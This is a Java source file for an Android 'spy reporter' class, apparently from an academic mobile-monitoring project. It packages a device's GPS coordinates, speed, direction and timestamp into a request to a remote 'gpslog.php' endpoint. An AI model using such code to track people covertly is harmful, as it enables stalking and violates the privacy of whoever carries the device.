package th.ac.bu.mcop.android.spy.reporter;

import java.net.URLEncoder;

import th.ac.bu.mcop.http.core.connection.Request;
import th.ac.bu.mcop.mobile.monitor.core.Report;
import th.ac.bu.mcop.mobile.monitor.report.GPS;

public class GpsSpyReporter extends SpyReporter {

	@Override
	protected Request createRequest(Report report) {
		GPS gps = (GPS) report;
		String date = LOG_DATE_FORMAT.format(gps.date);
		String time = LOG_TIME_FORMAT.format(gps.date);
		String lon = String.valueOf(gps.lon);
		String lat = String.valueOf(gps.lat);
		String speed = String.valueOf(gps.speed);
		String dir = String.valueOf(gps.dir);
		
		return new Request(WEBAPI_SERVER_ROOT + "/gpslog.php?sID=" + getSession() +
				"&long=" + URLEncoder.encode(lon) + "&lat=" + URLEncoder.encode(lat) +
				"&speed=" + URLEncoder.encode(speed) + "&dir=" + URLEncoder.encode(dir) +
				"&date=" + URLEncoder.encode(date) + "&time=" + URLEncoder.encode(time));
	}
}
